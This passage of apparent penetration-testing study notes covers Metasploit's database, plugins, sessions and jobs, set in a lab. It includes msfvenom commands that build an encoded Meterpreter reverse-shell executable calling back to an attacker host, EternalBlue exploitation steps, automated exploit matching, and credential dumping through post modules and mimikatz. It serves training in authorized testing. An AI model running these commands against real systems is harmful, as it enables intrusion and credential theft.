        - Set `RHOSTS` from database:
            
            ```
            msf6 > hosts -R
            [*] Setting RHOSTS: 10.10.10.40
            
            ```
            
        - Run exploit with the encoded payload.
- **Benefit**: The database streamlines target selection and configuration, reducing manual input.

### Common Issues and Troubleshooting

- **Database Not Connecting**:
    - **Solution**:
        - Verify PostgreSQL is running:
            
            ```
            sudo service postgresql status
            
            ```
            
        - Reinitialize:
            
            ```
            msfdb reinit
            
            ```
            
        - Check `database.yml`:
            
            ```
            cat /usr/share/metasploit-framework/config/database.yml
            
            ```
            
    - **Test Connection**:
        
        ```
        msf6 > db_status
        
        ```
        
- **Import Fails**:
    - **Solution**:
        - Ensure the file is in XML format.
        - Convert Nmap output:
            
            ```
            nmap -sV -oX Target.xml 10.10.10.40
            
            ```
            
        - Check file permissions:
            
            ```
            chmod 644 Target.xml
            
            ```
            
- **Workspace Confusion**:
    - **Solution**:
        - List workspaces:
            
            ```
            msf6 > workspace
            
            ```
            
        - Switch to the correct workspace:
            
            ```
            msf6 > workspace Client_Network
            
            ```
            
- **Credential Errors**:
    - **Solution**:
        - Verify syntax for `creds add` (e.g., correct hash format).
        - Example for NTLM:
            
            ```
            msf6 > creds add user:admin ntlm:E2FC150748F7751DD448E6B105741864:A1074AG9B1BDE45403AB680504B
            
            ```
            

### Ethical and Practical Notes

- **Ethical Use**: Databases store sensitive data (e.g., credentials, hashes). Use only in authorized environments and secure exported files (e.g., encrypt `backup.xml`).
- **Lab Setup**:
    - Use VMs (e.g., Windows 7 for MS17-010 testing) or platforms like Hack The Box or TryHackMe.
    - Example: Set up a Windows 7 VM with SMB enabled to test the Nmap scan and MS17-010 exploit.
- **Backup Data**: Regularly export workspaces to avoid data loss:
    
    ```
    msf6 > db_export -f xml backup_$(date +%F).xml
    
    ```
    
- **Integration with Other Tools**:
    - Import Nessus or Nexpose results (XML format) using `db_import`.
    - Example:
        
        ```
        msf6 > db_import nessus_scan.xml
        
        ```
        

### Next Steps

- **Explore Advanced Database Use**:
    - Use `vulns` to track vulnerabilities:
        
        ```
        msf6 > vulns
        
        ```
        
    - Automate credential testing with modules like `auxiliary/scanner/smb/smb_login`:
        
        ```
        msf6 > use auxiliary/scanner/smb/smb_login
        msf6 > set RHOSTS 10.10.10.40
        msf6 > run
        
        ```
        
- **Custom Scripts**:
    - Write Ruby scripts to automate database queries (e.g., extract all SMB credentials).
    - Example: [https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-modules.html](https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-modules.html)
- **Further Reading**:
    - Metasploit Database Guide: [https://docs.metasploit.com/docs/using-metasploit/advanced/database.html](https://docs.metasploit.com/docs/using-metasploit/advanced/database.html)
    - PostgreSQL Documentation: [https://www.postgresql.org/docs/](https://www.postgresql.org/docs/)
    - Nmap XML Output: [https://nmap.org/book/output-formats-xml-output.html](https://nmap.org/book/output-formats-xml-output.html)

## 9. Metasploit Plugins

**Focus**: Explains the role of plugins in Metasploit, which integrate third-party software to extend functionality, automate tasks, and simplify data management. Details how to load, use, and install plugins, with examples like the Nessus and pentest plugins, and introduces Ruby Mixins as a programming concept for advanced customization.

### Key Points with Explanations

### Overview of Plugins

- **Definition**: Plugins are third-party software modules integrated into Metasploit with approval from their creators. They can be commercial products (e.g., Nessus Community Edition) or individual projects developed by the community.
- **Purpose**:
    1. **Integration**: Bring functionality of external tools (e.g., Nessus, Nmap) into `msfconsole` or Metasploit Pro, reducing the need to switch between tools.
    2. **Automation**: Automatically document results (e.g., hosts, services, vulnerabilities) in the Metasploit database, streamlining workflows.
    3. **Extensibility**: Interact with Metasploit’s API to automate repetitive tasks, add new commands, or extend framework capabilities.
    4. **Convenience**: Provide at-a-glance access to scan results and vulnerabilities within `msfconsole`.
- **Benefits**:
    - Eliminate manual import/export of results.
    - Centralize data management in the database (as discussed in the "8 MSF Databases.pdf" notes).
    - Enhance productivity by automating complex tasks.
- **Examples of Plugins** (page 4):
    - Pre-installed: Nmap, Nessus, Nexpose, Mimikatz (v1), Sqlmap, Retirejs, Priv, Incognito.
    - Community: Darkoperator’s Metasploit-Plugins (e.g., pentest.rb).

### Using Plugins

- **Default Directory**: Plugins are stored in `/usr/share/metasploit-framework/plugins`.
    - **List Plugins** (page 1):
        
        ```
        K4y0x13ehtb[/htb] ls /usr/share/metasploit-framework/plugins
        aggregator.rb  beholder.rb  event_tester.rb  komand.rb  msfd.rb  nexpose.rb
        alias.rb  db_credcollect.rb  ftautoregen.rb  lab.rb  msgrpc.rb  openvas.rb
        auto_add_route.rb  db_tacker.rb  ips_filter.rb  libnotify.rb  nessus.rb  pcap_log.rb
        
        ```
        
- **Loading a Plugin**:
    - **Command** (page 1):
        
        ```
        msf6 > load nessus
        [*] Nessus Bridge for Metasploit
        [*] Type nessus_help for a command listing
        [*] Successfully loaded plugin: Nessus
        
        ```
        
    - **Verify Commands**:
        
        ```
        msf6 > nessus_help
        Command                Help Text
        Generic Commands
        nessus_connect         Connect to a Nessus server
        nessus_logout          Logout from the Nessus server
        nessus_login           Login into the connected Nessus server with a different user
        nessus_user_del        Delete a Nessus User
        nessus_user_passwd     Change Nessus Users Password
        Policy Commands
        nessus_policy_list     List all policies
        nessus_policy_del      Delete a policy
        <SNIP>
        
        ```
        
    - **Error for Non-Existent Plugin** (page 2):
        
        ```
        msf6 > load Plugin_That_Does_Not_Exist
        Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist
        
        ```
        
        - **Solution**: Ensure the plugin’s `.rb` file is in the correct directory with proper permissions.
- **Using Plugin Commands**:
    - Each plugin provides a unique set of commands, accessible via its help menu (e.g., `nessus_help`).
    - Example: Use Nessus to connect to a server and list policies:
        
        ```
        msf6 > nessus_connect <username>:<password>@<nessus_server_ip>:8834
        msf6 > nessus_policy_list
        
        ```
        
    - **Best Practice**: Review the plugin’s documentation or help menu to understand its commands and use cases.

### Installing New Plugins

- **Automatic Installation**:
    - Popular plugins are included with Parrot OS updates, available in the Parrot repository.
    - Update Metasploit to get the latest plugins:
        
        ```
        sudo apt update && sudo apt install metasploit-framework
        
        ```
        
- **Manual Installation**:
    - **Steps** (page 2):
        1. Download the plugin’s `.rb` file from the creator’s repository.
        2. Copy the file to `/usr/share/metasploit-framework/plugins` with proper permissions.
        3. Load the plugin in `msfconsole`.
    - **Example: Installing Darkoperator’s Metasploit-Plugins** (pages 2–3):
        - **Clone Repository**:
            
            ```
            K4y0x13ehtb[/htb] git clone <https://github.com/darkoperator/Metasploit-Plugins>
            K4y0x13ehtb[/htb] ls Metasploit-Plugins
            aggregator.rb  ips_filter.rb  pcap_log.rb  sqlmap.rb
            alias.rb  komand.rb  pentest.rb  thread.rb
            auto_add_route.rb  lab.rb  request.rb  token_adduser.rb
            beholder.rb  libnotify.rb  rssfeed.rb  token_hunter.rb
            db_credcollect.rb  msfd.rb  sample.rb  twitt.rb
            db_tacker.rb  msgrpc.rb  session_notifier.rb  wiki.rb
            event_tester.rb  nessus.rb  session_tagger.rb  wmap.rb
            ftautoregen.rb  nexpose.rb  socket_watcher.rb
            growl.rb  openvas.rb  sounds.rb
            
            ```
            
        - **Copy Plugin** (e.g., `pentest.rb`):
            
            ```
            K4y0x13ehtb[/htb] sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/
            
            ```
            
        - **Load Plugin**:
            
            ```
            K4y0x13ehtb[/htb] msfconsole -q
            msf6 > load pentest
            Version 1.6
            Pentest Plugin loaded.
            by Carlos Perez (carlos_perez[at]darkoperator.com)
            [*] Successfully loaded plugin: pentest
            
            ```
            
        - **Verify New Commands**:
            
            ```
            msf6 > help
            Tradecraft Commands
            check_footprint    Checks the possible footprint of a post module on a target system.
            
            auto_exploit Commands
            show_client_side   Show matched client side exploits from data imported from vuln scanners
            vuln_exploit       Runs exploits based on data imported from vuln scanners.
            
            Discovery Commands
            discover_db        Run discovery modules against current hosts in the database.
            network_discover   Performs a port-scan and enumeration of services found for network.
            pivot_network_discover  Performs enumeration of networks available to a specified Meterpreter session.
            show_session_networks  Enumerate the networks one could pivot thru Meterpreter in the session.
            
            Project Commands
            project            Command for managing projects.
            
            Postauto Commands
            app_creds          Run application password collection modules against specified sessions.
            get_lhost          List local IP addresses that can be used for LHOST.
            multi_cmd          Run shell command against several sessions.
            multi_meter_cmd    Run a Meterpreter Console Command against specified sessions.
            multi_meter_cmd_rc Run resource file with Meterpreter Console Commands against specified sessions.
            multi_post         Run a post module against specified sessions.
            multi_post_rc      Run resource file with post modules and options against specified sessions.
            sys_creds          Run system password collection modules against specified sessions.
            <SNIP>
            
            ```
            
            - The `pentest` plugin adds commands for discovery, automation, and post-exploitation, enhancing `msfconsole` functionality.
- **Permissions**:
    - Ensure the plugin file has appropriate permissions:
        
        ```
        sudo chmod 644 /usr/share/metasploit-framework/plugins/pentest.rb
        
        ```
        
    - Run `msfconsole` with sufficient privileges (e.g., `sudo` if needed).

### Popular Plugins

- **Pre-installed Plugins** (page 4):
    - **Nmap**: Integrates Nmap scanning, storing results in the database (as seen in "8 MSF Databases.pdf").
    - **Nessus**: Connects to a Nessus server for vulnerability scanning and imports results.
    - **Nexpose**: Integrates Rapid7’s Nexpose for vulnerability management.
    - **Mimikatz (v1)**: Extracts credentials from Windows systems (older version).
    - **Sqlmap**: Automates SQL injection testing.
    - **Retirejs**: Scans for vulnerable JavaScript libraries.
    - **Priv**: Likely related to privilege escalation modules.
    - **Incognito**: Manages impersonation of user tokens on compromised Windows systems.
- **Community Plugins**:
    - **Darkoperator’s Metasploit-Plugins**: Includes `pentest.rb` for advanced automation and discovery.
    - **Others**: Plugins like `openvas.rb`, `wmap.rb` (web vulnerability scanner), and `pcap_log.rb` (packet capture logging).
- **Use Case**:
    - Use the Nessus plugin to import vulnerability data and match it with Metasploit exploits.
    - Use the `pentest` plugin to automate discovery and credential collection across multiple sessions.

### Ruby Mixins in Metasploit

- **Definition** (page 5):
    - Mixins are Ruby classes that provide methods to other classes without requiring inheritance (i.e., inclusion rather than inheritance).
    - Implemented as Ruby **Modules** using the `include` keyword.
- **Purpose**:
    1. Provide optional features to a class.
    2. Share functionality across multiple classes without a parent-child relationship.
- **Role in Metasploit**:
    - Mixins enable flexible customization of plugins and modules.
    - Example: A plugin might use a Mixin to add database interaction methods without modifying core Metasploit classes.
- **Example** (conceptual, not from document):
    
    ```ruby
    module DatabaseHelper
      def query_hosts
        # Code to query hosts from the database
      end
    end
    
    class MyPlugin
      include DatabaseHelper
      # Now MyPlugin can use query_hosts
    end
    
    ```
    
- **Relevance**:
    - For beginners, Mixins are not critical to understand for basic plugin use.
    - For advanced users, Mixins are key to developing custom plugins or modules, allowing reusable code across the framework.
- **Further Reading** (suggested by document):
    - Ruby Mixins: [https://ruby-doc.org/core-2.7.0/Module.html](https://ruby-doc.org/core-2.7.0/Module.html)
    - Metasploit Development: [https://docs.metasploit.com/docs/development/developing-modules/](https://docs.metasploit.com/docs/development/developing-modules/)

### Practical Example: Using the Pentest Plugin

- **Scenario**: Automate network discovery and credential collection for a penetration test using the `pentest` plugin.
- **Steps**:
    1. **Install Plugin**:
        
        ```
        git clone <https://github.com/darkoperator/Metasploit-Plugins>
        sudo cp Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/
        
        ```
        
    2. **Load Plugin**:
        
        ```
        msfconsole -q
        msf6 > load pentest
        [*] Successfully loaded plugin: pentest
        
        ```
        
    3. **Set Up Database and Workspace** (from "8 MSF Databases.pdf"):
        
        ```
        sudo msfdb init
        msf6 > workspace -a Client_Network
        [*] Workspace: Client_Network
        
        ```
        
    4. **Run Discovery**:
        
        ```
        msf6 > discover_db
        [*] Running discovery modules against hosts in the database...
        
        ```
        
        - Scans hosts stored in the database (e.g., from prior `db_nmap` or `db_import`).
    5. **Import Vulnerability Data** (e.g., from Nessus):
        
        ```
        msf6 > load nessus
        msf6 > nessus_connect user:password@nessus_server:8834
        msf6 > nessus_scan_new <policy_id> "Client Scan" 10.10.10.0/24
        
        ```
        
        - Imports vulnerabilities into the database.
    6. **Match Exploits**:
        
        ```
        msf6 > vuln_exploit
        [*] Running exploits based on imported vulnerability data...
        
        ```
        
        - The `pentest` plugin matches vulnerabilities to exploits and attempts exploitation.
    7. **Collect Credentials**:
        
        ```
        msf6 > sys_creds
        [*] Running system password collection modules against specified sessions...
        
        ```
        
        - Collects credentials (e.g., SAM hashes) from compromised sessions.
    8. **Verify Results**:
        
        ```
        msf6 > hosts
        msf6 > services
        msf6 > creds
        msf6 > loot
        
        ```
        
- **Integration with Encoders** (from "7 MSF Encoders.pdf"):
    - Generate an encoded payload for a discovered target:
        
        ```
        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.15 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
        
        ```
        
    - Use database hosts to set `RHOSTS`:
        
        ```
        msf6 > hosts -R
        [*] Setting RHOSTS: 10.10.10.40
        
        ```
        
    - Run an exploit with the payload, leveraging plugin-discovered vulnerabilities.

### Common Issues and Troubleshooting

- **Plugin Fails to Load**:
    - **Solution**:
        - Verify the `.rb` file is in `/usr/share/metasploit-framework/plugins/`:
            
            ```
            ls /usr/share/metasploit-framework/plugins/
            
            ```
            
        - Check permissions:
            
            ```
            sudo chmod 644 /usr/share/metasploit-framework/plugins/pentest.rb
            
            ```
            
        - Ensure Metasploit is updated:
            
            ```
            sudo apt update && sudo apt install metasploit-framework
            
            ```
            
    - **Example Error**:
        
        ```
        msf6 > load Plugin_That_Does_Not_Exist
        Failed to load plugin from /usr/share/metasploit-framework/plugins/Plugin_That_Does_Not_Exist
        
        ```
        
- **Plugin Commands Not Working**:
    - **Solution**:
        - Check the plugin’s help menu (e.g., `nessus_help`).
        - Verify prerequisites (e.g., Nessus server running, valid credentials).
        - Example for Nessus:
            
            ```
            msf6 > nessus_connect user:password@nessus_server:8834
            
            ```
            
- **Database Integration Issues**:
    - **Solution**:
        - Ensure the database is connected:
            
            ```
            msf6 > db_status
            [*] Connected to msf. Connection type: postgresql.
            
            ```
            
        - Reinitialize if needed:
            
            ```
            msfdb reinit
            
            ```
            
- **Plugin Compatibility**:
    - **Solution**: Check the plugin’s documentation for Metasploit version compatibility.
    - Example: Darkoperator’s plugins may require specific Ruby dependencies.

### Ethical and Practical Notes

- **Ethical Use**:
    - Plugins like Nessus and Mimikatz handle sensitive data (e.g., vulnerabilities, credentials). Use only in authorized environments.
    - Secure plugin configuration (e.g., Nessus server credentials) to prevent unauthorized access.
- **Lab Setup**:
    - Test plugins in a controlled environment (e.g., Hack The Box, TryHackMe, or local VMs).
    - Example: Set up a Windows 7 VM with SMB vulnerabilities and a Nessus server to practice integration.
- **Backup Data**:
    - Use `db_export` to back up plugin-generated data:
        
        ```
        msf6 > db_export -f xml backup_$(date +%F).xml
        
        ```
        
- **Stay Updated**:
    - Regularly update Metasploit and Parrot OS to access new plugins:
        
        ```
        sudo apt update && sudo apt upgrade
        
        ```
        

### Next Steps

- **Explore Specific Plugins**:
    - **Nessus**: Learn advanced commands (e.g., `nessus_scan_new`, `nessus_report_get`).
    - **Mimikatz**: Use for credential dumping in post-exploitation:
        
        ```
        msf6 > load mimikatz
        msf6 > mimikatz_kerberos
        
        ```
        
    - **Sqlmap**: Automate SQL injection testing:
        
        ```
        msf6 > load sqlmap
        msf6 > sqlmap_run -u <http://target.com/vuln.php?id=1>
        
        ```
        
- **Develop Custom Plugins**:
    - Use Ruby to create plugins for specific tasks (e.g., custom report generation).
    - Example: [https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-modules.html](https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-modules.html)
- **Combine with Other Features**:
    - Use plugins with encoders (from "7 MSF Encoders.pdf") to deliver payloads based on plugin-discovered vulnerabilities.
    - Leverage database integration (from "8 MSF Databases.pdf") to store and query plugin results.
- **Further Reading**:
    - Metasploit Plugin Guide: [https://docs.metasploit.com/docs/using-metasploit/advanced/plugins.html](https://docs.metasploit.com/docs/using-metasploit/advanced/plugins.html)
    - Darkoperator’s Plugins: [https://github.com/darkoperator/Metasploit-Plugins](https://github.com/darkoperator/Metasploit-Plugins)
    - Ruby Mixins: [https://ruby-doc.org/core-2.7.0/Module.html](https://ruby-doc.org/core-2.7.0/Module.html)

## 10. Metasploit Sessions

**Focus**: Explains how Metasploit manages multiple modules through **sessions**, which are dedicated control interfaces for deployed modules (e.g., exploits, payloads). Details how to list, interact with, and background sessions, as well as how to manage **jobs** to run tasks in the background, including handling port conflicts and persistent tasks.

### Key Points with Explanations

### Overview of Sessions

- **Definition**: Sessions are dedicated communication channels created by Metasploit to manage interactions between `msfconsole` and a target host after a successful exploit or auxiliary module execution.
- **Purpose**:
    1. **Multi-Module Management**: Allow simultaneous control of multiple modules (e.g., exploits, post-exploitation modules) by creating separate sessions for each.
    2. **Flexibility**: Enable switching between sessions to perform different tasks on the same or different targets.
    3. **Persistence**: Maintain connections to target hosts even when sessions are backgrounded, unless the session dies due to errors (e.g., payload runtime issues or network disruptions).
    4. **Integration**: Support running additional modules (e.g., post-exploitation) on existing sessions, leveraging established communication channels.
- **Key Features**:
    - Sessions can be **backgrounded** to free up the `msfconsole` prompt for other tasks.
    - Sessions can be converted into **jobs** to run tasks in the background, even if the session dies.
    - Common session types include **Meterpreter** (a powerful post-exploitation payload) and shell-based sessions (e.g., `generic/shell_reverse_tcp`).

### Using Sessions

- **Creating Sessions**:
    - Sessions are created automatically when an exploit or auxiliary module establishes a communication channel with the target.
    - Example: Running an exploit like `windows/smb/psexec_ssh` creates a Meterpreter session if successful.
- **Backgrounding a Session** (page 1):
    - **Methods**:
        1. **Keyboard Shortcut**: Press `Ctrl + Z` in a Meterpreter or shell session.
        2. **Command**: Type `background` in a Meterpreter session.
    - **Result**:
        - Prompts for confirmation to background the session.
        - Returns to the `msfconsole` prompt (`msf6 >`).
        - The session continues running in the background, maintaining the connection to the target.
    - **Example** (Meterpreter session):
        
        ```
        meterpreter > background
        [*] Backgrounding session 1...
        msf6 exploit(windows/smb/psexec_ssh) >
        
        ```
        
- **Listing Active Sessions** (page 1):
    - **Command**:
        
        ```
        msf6 exploit(windows/smb/psexec_ssh) > sessions
        Active sessions
        Id  Name  Type                    Information                             Connection
        1         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ MS01  10.10.10.129:443 -> 10.10.14.34:12345
        
        ```
        
    - **Details**:
        - **Id**: Unique session identifier (e.g., `1`).
        - **Name**: Optional name (blank in this case).
        - **Type**: Session type (e.g., `meterpreter x86/windows`).
        - **Information**: User and hostname (e.g., `NT AUTHORITY\\SYSTEM @ MS01`).
        - **Connection**: Source and destination IPs/ports (e.g., `10.10.10.129:443 -> 10.10.14.34:12345`).
- **Interacting with a Session** (page 1):
    - **Command**:
        
        ```
        msf6 exploit(windows/smb/psexec_ssh) > sessions -i 1
        [*] Starting interaction with 1...
        meterpreter >
        
        ```
        
    - **Use Case**:
        - Re-enter a backgrounded session to run Meterpreter commands (e.g., `getuid`, `shell`).
        - Example:
            
            ```
            meterpreter > getuid
            Server username: NT AUTHORITY\\SYSTEM
            
            ```
            
- **Running Additional Modules on a Session** (page 2):
    - **Process**:
        1. Background the current session:
            
            ```
            meterpreter > background
            msf6 >
            
            ```
            
        2. Search for a post-exploitation module:
            
            ```
            msf6 > search post/windows
            
            ```
            
        3. Select a module and set the session ID:
            
            ```
            msf6 > use post/windows/gather/credentials/credential_collector
            msf6 post(windows/gather/credentials/credential_collector) > show options
            Module options (post/windows/gather/credentials/credential_collector):
              Name    Current Setting  Required  Description
              ----    ---------------  --------  -----------
              SESSION                  yes       The session to run this module on
            msf6 post(windows/gather/credentials/credential_collector) > set SESSION 1
            SESSION => 1
            msf6 post(windows/gather/credentials/credential_collector) > run
            
            ```
            
    - **Common Post-Exploitation Modules**:
        - **Credential Gatherers**: Collect passwords, hashes (e.g., `post/windows/gather/credentials/credential_collector`).
        - **Local Exploit Suggesters**: Identify privilege escalation opportunities (e.g., `post/multi/recon/local_exploit_suggester`).
        - **Internal Network Scanners**: Discover other hosts on the network (e.g., `post/windows/gather/arp_scanner`).
    - **Benefit**: Leverages an existing session’s stable connection to perform additional tasks without re-exploiting the target.

### Jobs

- **Definition**: Jobs are background tasks in Metasploit, such as exploits or listeners, that continue running independently of the `msfconsole` prompt. Sessions can be associated with jobs to manage resources like ports.
- **Purpose**:
    1. **Resource Management**: Free up ports used by exploits or listeners without terminating sessions.
    2. **Persistence**: Allow tasks to run in the background, even if a session dies.
    3. **Automation**: Enable long-running tasks (e.g., reverse shell listeners) without occupying the console.
- **Use Case** (page 2):
    - If an exploit uses a port (e.g., `4444`) and another module needs the same port, the original task must be managed as a job to free the port without killing the session.
- **Managing Jobs**:
    - **View Help Menu** (page 2):
        
        ```
        msf6 exploit(multi/handler) > jobs -h
        Usage: jobs [options]
        Active job manipulation and interaction.
        OPTIONS:
          -K          Terminate all running jobs.
          -P          Persist all running jobs on restart.
          -S <string> Row search filter.
          -h          Help banner.
          -i <id>     Lists detailed information about a running job.
          -k <id>     Terminate jobs by job ID and/or range.
          -l          List all running jobs.
          -p <id>     Add persistence to job by job ID.
          -v          Print more detailed info. Use with -i and -l.
        
        ```
        
    - **List Running Jobs** (page 3):
        
        ```
        msf6 exploit(multi/handler) > jobs -l
        Jobs
        Id  Name                     Payload                        Payload opts
        0   Exploit: multi/handler   generic/shell_reverse_tcp      tcp://10.10.14.34:4444
        
        ```
        
    - **Kill a Specific Job**:
        
        ```
        msf6 exploit(multi/handler) > jobs -k 0
        [*] Killing job 0...
        
        ```
        
    - **Kill All Jobs**:
        
        ```
        msf6 exploit(multi/handler) > jobs -K
        [*] Killing all jobs...
        
        ```
        
    - **View Detailed Job Info**:
        
        ```
        msf6 exploit(multi/handler) > jobs -i 0 -v
        
        ```
        
- **Running Exploits as Jobs** (page 3):
    - **Command**:
        
        ```
        msf6 exploit(multi/handler) > exploit -j
        [*] Exploit running as background job 0.
        [*] Exploit completed, but no session was created.
        [*] Started reverse TCP handler on 10.10.14.34:4444
        
        ```
        
    - **Explanation**:
        - The `j` flag runs the exploit in the context of a job, placing it in the background.
        - Useful for listeners like `multi/handler`, which wait for incoming connections (e.g., reverse shells).
    - **Help Menu for Exploit Command**:
        
        ```
        msf6 exploit(multi/handler) > exploit -h
        Usage: exploit [options]
        Launches an exploitation attempt.
        OPTIONS:
          -J          Force running in the foreground, even if passive.
          -e <opt>    The payload encoder to use. If none is specified, ENCODER is used.
          -f          Force the exploit to run regardless of the value of MinimumRank.
          -h          Help banner.
          -j          Run in the context of a job.
          <SNIP>
        
        ```
        
- **Port Conflict Example** (page 2):
    - **Problem**: An exploit uses port `4444`, and another module needs the same port.
    - **Incorrect Solution**: Using `Ctrl + C` to terminate the session does not free the port, as the listener may still be active.
    - **Correct Solution**:
        1. List jobs:
            
            ```
            msf6 > jobs -l
            Jobs
            Id  Name                     Payload                        Payload opts
            0   Exploit: multi/handler   generic/shell_reverse_tcp      tcp://10.10.14.34:4444
            
            ```
            
        2. Kill the job:
            
            ```
            msf6 > jobs -k 0
            [*] Killing job 0...
            
            ```
            
        3. Verify the port is free:
            
            ```
            netstat -tuln | grep 4444
            
            ```
            
        4. Run the new module on port `4444`.

### Integration with Previous Notes

- **Encoders ("7 MSF Encoders.pdf")**:
    - Sessions often involve payloads (e.g., Meterpreter) that can be encoded to evade detection.
    - Example: Generate an encoded payload and use it in a session:
        
        ```
        msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.34 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o payload.exe
        
        ```
        
        - Set up a listener as a job:
            
            ```
            msf6 > use exploit/multi/handler
            msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
            msf6 exploit(multi/handler) > set LHOST 10.10.14.34
            msf6 exploit(multi/handler) > set LPORT 4444
            msf6 exploit(multi/handler) > exploit -j
            [*] Exploit running as background job 0.
            [*] Started reverse TCP handler on 10.10.14.34:4444
            
            ```
            
        - When the target executes `payload.exe`, a Meterpreter session is created:
            
            ```
            msf6 exploit(multi/handler) > sessions
            Active sessions
            Id  Name  Type                    Information                             Connection
            1         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ TARGET  10.10.10.129:4444 -> 10.10.14.34:12345
            
            ```
            
- **Databases ("8 MSF Databases.pdf")**:
    - Sessions integrate with the database to store session-related data (e.g., credentials, loot).
    - Example: Collect credentials in a session and store them:
        
        ```
        msf6 > sessions -i 1
        meterpreter > run post/windows/gather/credentials/credential_collector
        [*] Collecting credentials...
        msf6 > creds
        Credentials
        host         service  user  password
        10.10.10.129 445/tcp  admin notpassword
        
        ```
        
    - Use database hosts to target sessions:
        
        ```
        msf6 > hosts -R
        [*] Setting RHOSTS: 10.10.10.129
        msf6 > use exploit/windows/smb/psexec_ssh
        msf6 exploit(windows/smb/psexec_ssh) > run
        
        ```
        
- **Plugins ("9 MSF Plugins.pdf")**:
    - Plugins like `pentest.rb` can automate session management (e.g., running post-exploitation modules across multiple sessions).
    - Example: Use the `pentest` plugin to collect credentials from all sessions:
        
        ```
        msf6 > load pentest
        msf6 > sys_creds
        [*] Running system password collection modules against specified sessions...
        
        ```
        
    - Plugins like `nessus` can import vulnerabilities to guide session-based exploitation.

### Practical Example: Managing Sessions and Jobs

- **Scenario**: Exploit a Windows target, create a Meterpreter session, run post-exploitation modules, and manage a port conflict using jobs.
- **Steps**:
    1. **Set Up Database and Workspace**:
        
        ```
        sudo msfdb init
        msf6 > workspace -a Client_Network
        [*] Workspace: Client_Network
        
        ```
        
    2. **Run an Exploit** (e.g., MS17-010):
        
        ```
        msf6 > use exploit/windows/smb/ms17_010_eternalblue
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.10.129
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set PAYLOAD windows/meterpreter/reverse_tcp
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.10.14.34
        msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
        msf6 exploit(windows/smb/ms17_010_eternalblue) > run
        [*] Meterpreter session 1 opened (10.10.14.34:4444 -> 10.10.10.129:12345)
        meterpreter >
        
        ```
        
    3. **Background the Session**:
        
        ```
        meterpreter > background
        [*] Backgrounding session 1...
        msf6 exploit(windows/smb/ms17_010_eternalblue) >
        
        ```
        
    4. **List Sessions**:
        
        ```
        msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
        Active sessions
        Id  Name  Type                    Information                             Connection
        1         meterpreter x86/windows  NT AUTHORITY\\SYSTEM @ MS01  10.10.10.129:12345 -> 10.10.14.34:4444
        
        ```
        
    5. **Run a Post-Exploitation Module**:
        
        ```
        msf6 > use post/windows/gather/credentials/credential_collector
        msf6 post(windows/gather/credentials/credential_collector) > set SESSION 1
        msf6 post(windows/gather/credentials/credential_collector) > run
        [*] Collecting credentials...
        msf6 > creds
        Credentials
        host         service  user  password
        10.10.10.129 445/tcp  admin notpassword
        
        ```
        
    6. **Handle a Port Conflict**:
        - Attempt to run another exploit on port `4444`:
            
            ```
            msf6 > use exploit/multi/handler
            msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_tcp
            msf6 exploit(multi/handler) > set LHOST 10.10.14.34
            msf6 exploit(multi/handler) > set LPORT 4444
            msf6 exploit(multi/handler) > run
            [*] Error: Address already in use
            
            ```
            
        - List and kill the conflicting job:
            
            ```
            msf6 exploit(multi/handler) > jobs -l
            Jobs
            Id  Name                     Payload                        Payload opts
            0   Exploit: multi/handler   windows/meterpreter/reverse_tcp tcp://10.10.14.34:4444
            msf6 exploit(multi/handler) > jobs -k 0
            [*] Killing job 0...
            
            ```
            
        - Retry the exploit as a job:
            
            ```
            msf6 exploit(multi/handler) > exploit -j
            [*] Exploit running as background job 1.
            [*] Started reverse TCP handler on 10.10.14.34:4444
            
            ```
            
    7. **Automate with Plugins** (using `pentest.rb`):
        
        ```
        msf6 > load pentest
        msf6 > multi_post post/windows/gather/credentials/credential_collector SESSION=1
        [*] Running post module against session 1...
        
        ```
        
    8. **Export Session Data**:
        
        ```
        msf6 > db_export -f xml Client_Network_$(date +%F).xml
        [*] Finished export of workspace Client_Network to Client_Network_2025-05-13.xml [xml]...
        
        ```
        

### Common Issues and Troubleshooting

- **Session Dies**:
    - **Cause**: Payload runtime errors, network issues, or target reboot.
    - **Solution**:
        - Check session status:
            
            ```
            msf6 > sessions
            
            ```
            
        - Re-run the exploit:
            
            ```
            msf6 > run
            
            ```
            
        - Use a more stable payload (e.g., `windows/meterpreter/reverse_tcp` instead of `generic/shell_reverse_tcp`).
- **Port Conflict**:
    - **Solution**:
        - List jobs:
            
            ```
            msf6 > jobs -l
            
            ```
            
        - Kill conflicting job:
            
            ```
            msf6 > jobs -k <id>
            
            ```
            
        - Use a different port:
            
            ```
            msf6 > set LPORT 4445
            
            ```
            
- **Session Not Responding**:
    - **Solution**:
        - Verify session is active:
            
            ```
            msf6 > sessions -i <id>
            
            ```
            
        - Check network connectivity:
            
            ```
            ping 10.10.10.129
            
            ```
            
        - Restart the session if needed.
- **Job Fails to Start**:
    - **Solution**:
        - Check for errors in the job output:
            
            ```
            msf6 > jobs -i <id> -v
            
            ```
            
        - Ensure correct module options (e.g., `PAYLOAD`, `LHOST`).

### Ethical and Practical Notes

- **Ethical Use**:
    - Sessions provide deep access to target systems (e.g., via Meterpreter). Use only in authorized environments to avoid legal issues.
    - Secure session data (e.g., credentials, loot) stored in the database.
- **Lab Setup**:
    - Test sessions in a controlled environment (e.g., Hack The Box, TryHackMe, or local VMs).
